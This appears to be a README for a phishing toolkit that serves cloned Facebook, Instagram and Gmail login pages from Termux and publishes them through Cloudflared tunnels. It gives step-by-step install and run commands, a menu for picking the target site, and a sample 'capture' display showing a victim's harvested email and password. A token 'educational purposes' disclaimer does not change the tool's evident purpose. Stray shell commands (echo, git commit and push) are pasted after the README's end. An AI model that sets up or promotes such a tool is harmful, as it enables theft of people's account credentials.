# 🔥 RASHD BRO · Neon Edition v3.0

> **Developer:** v4zrashd
> **Platform:** Termux (Android) / Linux
> **Language:** Python 3.14+
> **Dependencies:** colorama, cloudflared (optional)

---

## 🚀 Full Install & Run (One Command)

### Clone & Install
```bash
git clone https://github.com/v4zrashd/RASHD-BRO.git
cd RASHD-BRO
pip install colorama -q
python3 V4Zteem.py
```

### Run Directly (No Clone)
```bash
git clone https://github.com/v4zrashd/RASHD-BRO.git && cd RASHD-BRO && pip install colorama -q && python3 V4Zteem.py
```

---

## 📋 Complete Installation Steps

### Step 1: Install Termux
1. Download **Termux** from [F-Droid](https://f-droid.org/en/packages/com.termux/)
2. Open Termux and update packages:
```bash
pkg update && pkg upgrade -y
```

### Step 2: Install Python & Dependencies
```bash
pkg install python -y
pip install colorama -q
```

### Step 3: Clone Repository
```bash
git clone https://github.com/v4zrashd/RASHD-BRO.git
cd RASHD-BRO
```

### Step 4: Install Cloudflared (Optional — For Public URLs)
```bash
pkg install cloudflared -y
# OR download directly:
pkg install wget -y
wget https://github.com/cloudflare/cloudflared/releases/download/v2024.0.1/cloudflared-linux-amd64 -O cloudflared
chmod +x cloudflared
mv cloudflared $PREFIX/bin/
```

### Step 5: Run the Tool
```bash
python3 V4Zteem.py
```

---

## 🖥️ Menu Guide

### Site Selection
| Input | Site | Route |
|-------|------|-------|
| `1` | Facebook | `/fb` |
| `2` | Instagram | `/insta` |
| `3` | Gmail | `/mail` |
| `4` | All 3 Sites | Hub |

### Mode Selection
| Input | Mode | Description |
|-------|------|-------------|
| `1` | Localhost | `http://127.0.0.1:PORT` |
| `2` | Cloudflared | Public `*.trycloudflare.com` URL |
| `0` | Back | Return to site selection |

### Exit
| Input | Action |
|-------|--------|
| `0` (main menu) | Exit RASHD BRO |

---

## 📸 Capture Display

When a victim submits credentials:
```
═══════════════════════════════════════════════════
 ★ CAPTURE #1 — [FB] FB · PAGE 1 · LOGIN ★
═══════════════════════════════════════════════════
  ⏱ TIME       2026-09-28  14:30:22
  📍 FROM      192.168.1.100

  │  ACCOUNT     │  ◆ email@example.com
  │  PASSWORD    │  ★ mysecretpass
═══════════════════════════════════════════════════
```

---

## 📝 All Commands Reference

### Git Commands
```bash
git clone https://github.com/v4zrashd/RASHD-BRO.git    # Clone repo
cd RASHD-BRO                                           # Enter directory
git pull origin main                                   # Update repo
git status                                             # Check status
```

### Python Commands
```bash
python3 V4Zteem.py                                     # Run tool
pip install colorama -q                                # Install dependency
pip install -r requirements.txt                        # Install all deps
python3 -m py_compile V4Zteem.py                       # Check syntax
```

### Termux Commands
```bash
pkg update && pkg upgrade -y                           # Update all
pkg install python -y                                  # Install Python
pkg install python-pip -y                              # Install pip
pip install colorama -q                                # Install colorama
pkg install cloudflared -y                             # Install Cloudflared
```

### Cloudflared Commands
```bash
cloudflared --version                                  # Check version
cloudflared tunnel --url http://localhost:PORT         # Expose tunnel
```

### Navigation Commands
```bash
1 → Enter → 1 → Enter → Enter    # FB + Localhost
4 → Enter → 2 → Enter            # All + Cloudflared
0 → Enter → 0 → Enter            # Exit
```

---

## 🛠️ Troubleshooting

| Problem | Solution |
|---------|----------|
| `ModuleNotFoundError: colorama` | `pip install colorama -q` |
| `cloudflared not found` | `pkg install cloudflared -y` |
| `No free port` | Close other servers or specify port |
| `Port in use` | Tool auto-finds next free port |
| `File not found` | Ensure all files in same directory |
| `Permission denied` | `chmod +x V4Zteem.py` |
| `Git not found` | `pkg install git -y` |

---

## 📁 File Structure

```
RASHD-BRO/
├── V4Zteem.py           # Main script (383 lines)
├── README.md            # This file
├── v4z_config.json      # Configuration
├── index.html           # Hub page
├── fb.html              # Facebook clone
├── insta.html           # Instagram clone
├── mail.html            # Gmail clone
├── .gitignore           # Git ignore rules
├── __pycache__/         # Python cache (auto)
└── v4zphis_*/          # Temp dirs (auto-created)
```

---

## ⚡ Quick Install (Copy-Paste)

```bash
git clone https://github.com/v4zrashd/RASHD-BRO.git && cd RASHD-BRO && pip install colorama -q && python3 V4Zteem.py
```

---

## 🔒 Legal Disclaimer

> ⚠️ **WARNING**: This tool is for educational purposes only.
> Unauthorized use against others is illegal.
> The developer is NOT responsible for any misuse.
> Use only on your own systems or with explicit permission.

---

## 📄 License

**RASHD BRO · Neon Edition v3.0**
Developer: v4zrashd
All rights reserved.

---

## 🔗 Quick Reference

| Command | Description |
|---------|-------------|
| `python3 V4Zteem.py` | Start the tool |
| `git clone https://github.com/v4zrashd/RASHD-BRO.git` | Clone repo |
| `1` → `1` → `1` → Enter | FB + Localhost |
| `4` → `2` → Enter | All + Cloudflared |
| `0` → `0` | Exit |
```

echo "README.md updated!"
git add README.md
git commit -m "Update README with full install commands"
git push origin main 2>&1
echo "---"
echo "=== Final check ==="
git ls-files
git log --oneline -6
echo "---"
echo "✅ DONE!"
